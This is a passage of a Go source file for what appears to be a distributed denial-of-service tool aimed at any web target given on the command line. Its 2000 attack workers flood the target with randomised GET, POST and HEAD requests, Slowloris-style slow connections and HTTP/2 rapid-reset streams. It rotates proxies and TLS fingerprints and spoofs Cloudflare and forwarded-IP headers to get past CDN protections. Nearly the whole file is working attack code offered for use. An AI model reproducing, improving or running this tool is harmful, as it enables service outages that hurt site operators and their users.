func generateUUID() string {
	return fmt.Sprintf("%s-%s-%s-%s-%s",
		randomHex(4),
		randomHex(2),
		randomHex(2),
		randomHex(2),
		randomHex(6))
}

func generateCookies() string {
	cookies := []string{}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("session_id=%s", randomBase64(24)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("user_token=%s", randomHex(32)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("csrf_token=%s", randomBase64(16)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("auth_token=%s", randomHex(16)))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("user_id=%d", randInt(1000, 99999)))
	}
	langs := []string{"en", "fr", "de", "es", "pt", "it", "ja", "ko", "zh", "ru"}
	themes := []string{"light", "dark", "auto"}
	currencies := []string{"USD", "EUR", "GBP", "JPY", "CAD", "AUD"}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("lang=%s", langs[randInt(0, len(langs)-1)]))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("theme=%s", themes[randInt(0, len(themes)-1)]))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("currency=%s", currencies[randInt(0, len(currencies)-1)]))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("_ga=GA1.2.%d.%d", randInt(1000000000, 9999999999), int(time.Now().Unix())))
	}
	if randBool() {
		cookies = append(cookies, fmt.Sprintf("_gid=GA1.2.%d.%d", randInt(1000000000, 9999999999), int(time.Now().Unix())))
	}
	if len(cookies) == 0 {
		return ""
	}
	return strings.Join(cookies, "; ")
}

func detectProvider(ip string) string {
	if strings.HasPrefix(ip, "104.") || strings.HasPrefix(ip, "172.") || strings.HasPrefix(ip, "173.") {
		return "cloudflare"
	} else if strings.HasPrefix(ip, "136.") || strings.HasPrefix(ip, "138.") || strings.HasPrefix(ip, "148.") {
		return "hetzner"
	} else if strings.HasPrefix(ip, "159.") || strings.HasPrefix(ip, "167.") || strings.HasPrefix(ip, "198.") {
		return "digitalocean"
	} else if strings.HasPrefix(ip, "52.") || strings.HasPrefix(ip, "54.") || strings.HasPrefix(ip, "18.") {
		return "aws"
	}
	providers := []string{"cloudflare", "hetzner", "digitalocean", "aws"}
	return providers[randInt(0, len(providers)-1)]
}

func generateAdvancedPath() string {
	if randInt(1, 100) <= 30 {
		depth := randInt(2, 6)
		path := ""
		for i := 0; i < depth; i++ {
			path += randomString(randInt(4, 12)) + "/"
		}
		if randBool() {
			extensions := []string{".php", ".html", ".jsp", ".asp", ".aspx"}
			path = strings.TrimSuffix(path, "/") + extensions[randInt(0, len(extensions)-1)]
		}
		return "/" + path
	}
	if randInt(1, 100) <= 20 {
		malforms := []string{
			"/" + randomString(4) + "/../" + randomString(4),
			"/./" + randomString(6) + "/..",
			"//" + randomString(8),
			"/%2e%2e%2f" + randomString(4),
			"/" + randomString(4) + "%00" + randomString(4),
		}
		return malforms[randInt(0, len(malforms)-1)]
	}
	paths := []string{
		"/", "/index.html", "/home", "/main", "/default", "/welcome",
		"/api/v1/users", "/api/v1/data", "/api/v2/info", "/api/v3/status",
		"/wp-admin", "/admin", "/login", "/dashboard", "/control-panel",
		"/static/css/main.css", "/static/js/app.js", "/static/images/logo.png",
		"/images/logo.png", "/favicon.ico", "/robots.txt", "/sitemap.xml",
		"/.env", "/config.json", "/api.json", "/manifest.json",
		"/graphql", "/rest/v1", "/oauth2/authorize", "/oauth2/token",
		"/health", "/status", "/metrics", "/debug", "/test",
	}
	if randInt(1, 100) <= 70 {
		return paths[randInt(0, len(paths)-1)]
	}
	return "/"
}

func generateCacheBustParams() string {
	styles := []string{
		"?v=" + strconv.Itoa(randInt(1, 1000000)),
		"?_=" + strconv.FormatInt(time.Now().UnixNano(), 10),
		"?rnd=" + randomString(16),
		"?cachebuster=" + randomString(8),
		"?" + randomString(4) + "=" + randomString(6) + "&" + randomString(5) + "=" + randomString(8),
		"?utm_source=" + randomString(6) + "&utm_medium=" + randomString(5) + "&utm_campaign=" + randomString(8),
		"?sessionid=" + randomString(32),
		"?PHPSESSID=" + randomString(26),
		"?jsessionid=" + randomString(24),
		func() string {
			numParams := randInt(5, 15)
			params := "?"
			for i := 0; i < numParams; i++ {
				params += randomString(randInt(3, 8)) + "=" + randomString(randInt(5, 20))
				if i < numParams-1 {
					params += "&"
				}
			}
			return params
		}(),
	}
	return styles[randInt(0, len(styles)-1)]
}

func generatePostPayload() (string, string) {
	payloadSizes := []int{2048, 4096, 8192, 16384, 32768, 65536}
	size := payloadSizes[randInt(0, len(payloadSizes)-1)]
	payloadType := randInt(1, 5)
	switch payloadType {
	case 1:
		numFields := randInt(5, 15)
		parts := make([]string, 0, numFields)
		for i := 0; i < numFields; i++ {
			fieldName := randomString(randInt(4, 10))
			fieldValue := randomString(size/numFields + randInt(1, 64))
			parts = append(parts, fieldName+"="+url.QueryEscape(fieldValue))
		}
		parts = append(parts, "submit=Submit")
		return strings.Join(parts, "&"), "application/x-www-form-urlencoded"
	case 2:
		data := map[string]interface{}{
			"username":  fmt.Sprintf("user%d", randInt(1000, 9999)),
			"email":     fmt.Sprintf("u%d@example.com", randInt(100, 9999)),
			"password":  randomBase64(16),
			"csrf":      randomBase64(32),
			"timestamp": time.Now().Unix(),
			"payload":   randomBase64(size / 3),
			"meta": map[string]interface{}{
				"lang":    "en-US",
				"tz":      "UTC",
				"version": "1.0.0",
			},
		}
		jsonBytes, _ := json.Marshal(data)
		return string(jsonBytes), "application/json"
	case 3:
		xml := `<?xml version="1.0" encoding="UTF-8"?><request><action>submit</action><items>`
		for i := 0; i < 10; i++ {
			xml += `<item><name>` + randomString(10) + `</name><value>` + randomString(size/20) + `</value></item>`
		}
		xml += `</items></request>`
		return xml, "application/xml"
	case 4:
		boundary := "----WebKitFormBoundary" + randomString(16)
		filename := randomString(8) + []string{".jpg", ".png", ".pdf", ".txt"}[randInt(0, 3)]
		fileContent := randomBase64(size / 4)
		payload := fmt.Sprintf(
			"--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\nContent-Type: application/octet-stream\r\n\r\n%s\r\n--%s\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload\r\n--%s--\r\n",
			boundary, filename, fileContent, boundary, boundary,
		)
		return payload, "multipart/form-data; boundary=" + boundary
	case 5:
		parts := []string{
			"search=" + url.QueryEscape(randomString(randInt(4, 20))),
			"filter=" + url.QueryEscape("name LIKE '%" + randomString(6) + "%'"),
			"page=" + strconv.Itoa(randInt(1, 1000)),
			"limit=" + strconv.Itoa(randInt(10, 100)),
			"sort=" + []string{"id", "date", "name", "price"}[randInt(0, 3)],
			"extra=" + url.QueryEscape(randomString(size-len("search=filter=page=limit=sort=extra="))),
		}
		return strings.Join(parts, "&"), "application/x-www-form-urlencoded"
	}
	return randomString(size), "application/x-www-form-urlencoded"
}

func generateStudentNumber() string {
	formats := []func() string{
		func() string {
			return fmt.Sprintf("%d-%05d", randInt(2015, 2025), randInt(1, 99999))
		},
		func() string {
			return fmt.Sprintf("%d%06d", randInt(2015, 2025), randInt(1, 999999))
		},
		func() string {
			return fmt.Sprintf("S-%07d", randInt(1, 9999999))
		},
		func() string {
			return fmt.Sprintf("%010d", randInt(1000000000, 9999999999))
		},
		func() string {
			return fmt.Sprintf("%02d-%05d", randInt(15, 25), randInt(1, 99999))
		},
		func() string {
			courses := []string{"CS", "IT", "ENG", "BUS", "MED", "LAW"}
			course := courses[randInt(0, len(courses)-1)]
			return fmt.Sprintf("%s-%d-%05d", course, randInt(2015, 2025), randInt(1, 99999))
		},
	}
	return formats[randInt(0, len(formats)-1)]()
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU() * 2)

	if len(os.Args) < 4 {
		printBanner()
		fmt.Println("Usage: go run main.go <target> <seconds> <GET|POST|HEAD|SLOW> [proxy] [aggressive]")
		fmt.Println("   proxy       → route through rotating ProxyScrape list")
		fmt.Println("   aggressive  → half of h2 rapid-reset workers use max-stream no-sleep mode (requires h2 + GET)")
		os.Exit(1)
	}

	useProxy := false
	aggressive := false
	for _, a := range os.Args[4:] {
		switch strings.ToLower(a) {
		case "proxy":
			useProxy = true
		case "aggressive":
			aggressive = true
		}
	}

	if useProxy {
		loadProxiesFromAPI()
		if len(proxies) > 0 {
			go proxyRefresher()
		} else {
			fmt.Println("[-] No Proxy Detected, Running Without Proxy")
			useProxy = false
		}
	}

	target := os.Args[1]
	durStr := os.Args[2]
	mode := strings.ToUpper(os.Args[3])

	if mode != "GET" && mode != "POST" && mode != "HEAD" && mode != "SLOW" {
		printBanner()
		fmt.Println("Mode GET, POST, HEAD, and SLOW")
		os.Exit(1)
	}

	u, err := url.Parse(target)
	if err != nil || u.Scheme == "" || u.Host == "" {
		if strings.Contains(target, ":") && !strings.Contains(target, "://") {
			target = "http://" + target
		} else if !strings.HasPrefix(target, "http") {
			target = "https://" + target
		}
		u, err = url.Parse(target)
		if err != nil {
			fmt.Println("Invalid target URL:", err)
			os.Exit(1)
		}
	}

	durationSec, err := strconv.Atoi(durStr)
	if err != nil {
		fmt.Println("Invalid duration:", err)
		os.Exit(1)
	}
	duration := time.Duration(durationSec) * time.Second

	fmt.Printf("[+] Auto-detecting supported protocols for %s...\n", target)
	protocols := detectProtocols(target)
	fmt.Printf("[+] Detected protocols: %s\n", strings.Join(protocols, ", "))

	printBanner()
	fmt.Printf("[+] Target: %s\n", target)
	fmt.Printf("[+] Mode: %s\n", mode)
	fmt.Printf("[+] Duration: %d sec\n", durationSec)
	fmt.Printf("[+] Workers: 2000\n")
	fmt.Printf("[+] Detected Protocols: %s\n", strings.Join(protocols, ", "))
	if useProxy && len(proxies) > 0 {
		fmt.Printf("[+] Proxies: %d (rotating + refresh every %.0f min)\n", len(proxies), refreshInterval.Minutes())
	}
	fmt.Println("[+] Starting... Ctrl+C to stop")

	poolSize := 500
	connectionPool := NewConnectionPool(poolSize, useProxy, u.Host)
	fmt.Printf("[+] JA3 Randomization: ON (utls per client)\n")

	var wg sync.WaitGroup
	done := make(chan struct{})
	stats := &atomicCounter{val: 0}
	startTime := time.Now()

	go func() {
		time.Sleep(duration)
		close(done)
	}()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		close(done)
	}()

	h2Supported := false
	for _, p := range protocols {
		if p == "h2" {
			h2Supported = true
			break
		}
	}

	const workers = 2000

	if h2Supported && mode == "GET" {
		rapidWorkers := workers / 4
		aggressiveWorkers := 0
		if aggressive {
			aggressiveWorkers = rapidWorkers / 2
		}
		normalWorkers := workers - rapidWorkers

		fmt.Printf("[+] HTTP/2 detected! %d rapid-reset workers (%d aggressive), %d normal flood workers\n", rapidWorkers, aggressiveWorkers, normalWorkers)

		normalRapid := rapidWorkers - aggressiveWorkers
		for i := 0; i < normalRapid; i++ {
			wg.Add(1)
			go func(id int) {
				defer wg.Done()
				rapidResetWorker(target, done, stats)
			}(i)
		}
		for i := 0; i < aggressiveWorkers; i++ {
			wg.Add(1)
			go func(id int) {
				defer wg.Done()
				rapidResetWorkerAggressive(target, done, stats)
			}(i)
		}
		for i := 0; i < normalWorkers; i++ {
			wg.Add(1)
			go func(id int) {
				defer wg.Done()
				attackWorker(target, u.Host, mode, done, stats, useProxy, connectionPool)
			}(i)
		}
	} else {
		for i := 0; i < workers; i++ {
			wg.Add(1)
			go func(id int) {
				defer wg.Done()
				attackWorker(target, u.Host, mode, done, stats, useProxy, connectionPool)
			}(i)
		}
	}

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-done:
				clearScreen()
				fmt.Printf("[+] Attack completed!\n")
				fmt.Printf("Target: %s\n", target)
				fmt.Printf("Mode: %s\n", mode)
				fmt.Printf("Duration: %d sec\n", durationSec)
				fmt.Printf("Total requests/streams: %d\n", stats.get())
				fmt.Printf("Average RPS: %.0f\n", float64(stats.get())/duration.Seconds())
				fmt.Printf("Elapsed time: %.0f sec\n", time.Since(startTime).Seconds())
				fmt.Printf("[+] JA3 Randomization: Active (utls)\n")
				return
			case <-ticker.C:
				clearScreen()
				printBanner()

				elapsed := time.Since(startTime).Seconds()
				rps := float64(stats.get()) / elapsed
				fmt.Printf("[+] Target: %s\n", target)
				fmt.Printf("[+] Mode: %s\n", mode)
				fmt.Printf("[+] Detected Protocols: %s\n", strings.Join(protocols, ", "))
				fmt.Printf("[+] Elapsed: %.0f / %d sec\n", elapsed, durationSec)
				fmt.Printf("[+] Total requests/streams: %d\n", stats.get())
				fmt.Printf("[+] Current RPS: %.0f\n", rps)
				if useProxy && len(proxies) > 0 {
					fmt.Printf("[+] Active proxies: %d\n", len(proxies))
				}
				fmt.Printf("[+] JA3 Fingerprints: utls rotating\n")
				fmt.Println("Press Ctrl+C to stop early")
			}
		}
	}()

	wg.Wait()
	connectionPool.CloseIdleConnections()
}

func clearScreen() {
	fmt.Print("\033[H\033[2J")
}

type atomicCounter struct {
	val int64
}

func (c *atomicCounter) inc() {
	atomic.AddInt64(&c.val, 1)
}

func (c *atomicCounter) get() int64 {
	return atomic.LoadInt64(&c.val)
}

func attackWorker(target, host, mode string, done chan struct{}, stats *atomicCounter, useProxy bool, pool *ConnectionPool) {
	for {
		select {
		case <-done:
			return
		default:
			client := pool.GetClient()
			if client == nil {
				time.Sleep(100 * time.Millisecond)
				continue
			}

			path := generateAdvancedPath()
			if mode != "SLOW" && randInt(1, 100) <= 70 {
				if strings.Contains(path, "?") {
					path += "&" + generateCacheBustParams()[1:]
				} else {
					path += generateCacheBustParams()
				}
			}

			fullURL := target
			if !strings.HasSuffix(target, "/") && !strings.HasPrefix(path, "/") {
				fullURL += "/" + path
			} else if strings.HasSuffix(target, "/") && strings.HasPrefix(path, "/") {
				fullURL = strings.TrimSuffix(target, "/") + path
			} else {
				fullURL += path
			}

			if mode == "SLOW" {
				u, _ := url.Parse(target)
				isTLS := u != nil && u.Scheme == "https"
				conn, err := net.DialTimeout("tcp", host, 5*time.Second)
				if err != nil {
					time.Sleep(200 * time.Millisecond)
					continue
				}
				var writeConn net.Conn = conn
				if isTLS {
					hostOnly := host
					if h, _, e := net.SplitHostPort(host); e == nil {
						hostOnly = h
					}
					tlsConn := tls.Client(conn, &tls.Config{ServerName: hostOnly, InsecureSkipVerify: true})
					conn.SetDeadline(time.Now().Add(10 * time.Second))
					if err := tlsConn.Handshake(); err != nil {
						conn.Close()
						time.Sleep(100 * time.Millisecond)
						continue
					}
					conn.SetDeadline(time.Time{})
					writeConn = tlsConn
				}
				writeConn.SetDeadline(time.Now().Add(300 * time.Second))

				fmt.Fprintf(writeConn, "GET %s HTTP/1.1\r\n", path)
				fmt.Fprintf(writeConn, "Host: %s\r\n", host)
				fmt.Fprintf(writeConn, "User-Agent: %s\r\n", randomUA())
				fmt.Fprintf(writeConn, "Accept: text/html\r\n")
				fmt.Fprintf(writeConn, "Connection: keep-alive\r\n\r\n")

				go func(c net.Conn, doneChan chan struct{}) {
					jitter := time.Duration(randInt(4, 12)) * time.Second
					ticker := time.NewTicker(jitter)
					defer ticker.Stop()
					for {
						select {
						case <-doneChan:
							return
						case <-ticker.C:
							fmt.Fprintf(c, "X-%s: %s\r\n", randomString(4), randomString(8))
							c.SetDeadline(time.Now().Add(300 * time.Second))
							jitter = time.Duration(randInt(4, 12)) * time.Second
							ticker.Reset(jitter)
						}
					}
				}(writeConn, done)
				stats.inc()
				time.Sleep(time.Duration(randInt(700, 1300)) * time.Millisecond)
				writeConn.Close()
				continue
			}

			var req *http.Request
			var err error
			if mode == "GET" {
				req, err = http.NewRequest("GET", fullURL, nil)
			} else if mode == "POST" {
				body, contentType := generatePostPayload()
				req, err = http.NewRequest("POST", fullURL, strings.NewReader(body))
				if err == nil {
					req.Header.Set("Content-Type", contentType)
				}
			} else if mode == "HEAD" {
				req, err = http.NewRequest("HEAD", fullURL, nil)
			}
			if err != nil {
				continue
			}

			req.Header.Set("User-Agent", randomUA())
			req.Header.Set("Referer", randomReferer())
			req.Header.Set("Accept", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
			req.Header.Set("Accept-Language", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
			req.Header.Set("Accept-Encoding", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
			req.Header.Set("Cache-Control", cacheControls[randInt(0, len(cacheControls)-1)])
			if randBool() {
				req.Header.Set("Pragma", "no-cache")
			}

			provider := detectProvider(host)

			if provider == "cloudflare" || randInt(1, 100) <= 40 {
				cfIP := generateCloudflareIP()
				req.Header.Set("CF-Connecting-IP", cfIP)
				req.Header.Set("True-Client-IP", cfIP)
				req.Header.Set("CF-IPCountry", []string{"US", "GB", "DE", "FR", "CA", "AU", "JP", "SG"}[randInt(0, 7)])
				req.Header.Set("X-Forwarded-For", cfIP)
				req.Header.Set("X-Real-IP", cfIP)
			}

			if provider == "hetzner" && randBool() {
				for _, h := range hetznerHeaders {
					for k, v := range h {
						if v == "" {
							req.Header.Set(k, generateRandomIP())
						} else {
							req.Header.Set(k, v)
						}
					}
				}
			}

			if provider == "digitalocean" && randBool() {
				for _, h := range digitaloceanHeaders {
					for k, v := range h {
						if k == "X-Forwarded-Host" && v == "" {
							req.Header.Set(k, host)
						} else if k == "X-Forwarded-Port" {
							req.Header.Set(k, v)
						}
					}
				}
			}

			if provider == "aws" && randBool() {
				for _, h := range awsHeaders {
					for k, v := range h {
						if k == "X-Amz-Cf-Id" && v == "" {
							req.Header.Set(k, randomHex(16))
						} else {
							req.Header.Set(k, v)
						}
					}
				}
			}

			numSecurity := randInt(1, 3)
			for i := 0; i < numSecurity; i++ {
				secHeader := securityHeaders[randInt(0, len(securityHeaders)-1)]
				for k, v := range secHeader {
					req.Header.Set(k, v)
				}
			}

			numModern := randInt(3, 6)
			usedModern := make(map[string]bool)
			for i := 0; i < numModern; i++ {
				modernHeader := modernHeaders[randInt(0, len(modernHeaders)-1)]
				for k, v := range modernHeader {
					if !usedModern[k] {
						req.Header.Set(k, v)
						usedModern[k] = true
					}
				}
			}

			if randInt(1, 100) <= 60 {
				numApp := randInt(1, 3)
				for i := 0; i < numApp; i++ {
					appHeader := appHeaders[randInt(0, len(appHeaders)-1)]
					for k, v := range appHeader {
						if v == "" {
							switch k {
							case "X-CSRF-Token":
								req.Header.Set(k, randomBase64(32))
							case "Authorization":
								req.Header.Set(k, "Bearer "+randomBase64(48))
							case "X-API-Key":
								req.Header.Set(k, randomHex(16))
							case "X-Device-ID":
								req.Header.Set(k, generateUUID())
							case "X-Session-ID":
								req.Header.Set(k, randomHex(32))
							}
						} else {
							req.Header.Set(k, v)
						}
					}
				}
			}

			if randInt(1, 100) <= 30 {
				numCDN := randInt(1, 2)
				for i := 0; i < numCDN; i++ {
					cdnHeader := cdnHeaders[randInt(0, len(cdnHeaders)-1)]
					for k, v := range cdnHeader {
						req.Header.Set(k, v)
					}
				}
			}

			if randInt(1, 100) <= 70 {
				cookies := generateCookies()
				if cookies != "" {
					req.Header.Set("Cookie", cookies)
				}
			}

			if randInt(1, 100) <= 15 {
				start := randInt(0, 1000)
				end := randInt(1001, 10000)
				req.Header.Set("Range", fmt.Sprintf("bytes=%d-%d", start, end))
			}

			if randBool() {
				req.Header.Set("Upgrade-Insecure-Requests", "1")
			}

			if randBool() {
				teValues := []string{"trailers", "deflate", "gzip", "identity"}
				req.Header.Set("TE", teValues[randInt(0, len(teValues)-1)])
			}

			if req.Header.Get("X-Forwarded-For") == "" && randInt(1, 100) <= 30 {
				req.Header.Set("X-Forwarded-For", generateRandomIP())
			}

			resp, err := client.Do(req)
			if err == nil {
				if mode != "HEAD" {
					io.Copy(io.Discard, io.LimitReader(resp.Body, 4096))
				}
				resp.Body.Close()
			}
			stats.inc()
		}
	}
}

func generateRandomIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		randInt(1, 255),
		randInt(1, 255),
		randInt(1, 255),
		randInt(1, 255),
	)
}

func randomUA() string {
	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(userAgents))))
	return userAgents[idx.Int64()]
}

func randomReferer() string {
	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(referers))))
	return referers[idx.Int64()]
}

func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	rand.Read(b)
	for i := range b {
		b[i] = letters[int(b[i])%len(letters)]
	}
	return string(b)
}

func randInt(min, max int) int {
	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
	return min + int(n.Int64())
}

func randBool() bool {
	n, _ := rand.Int(rand.Reader, big.NewInt(2))
	return n.Int64() == 1
}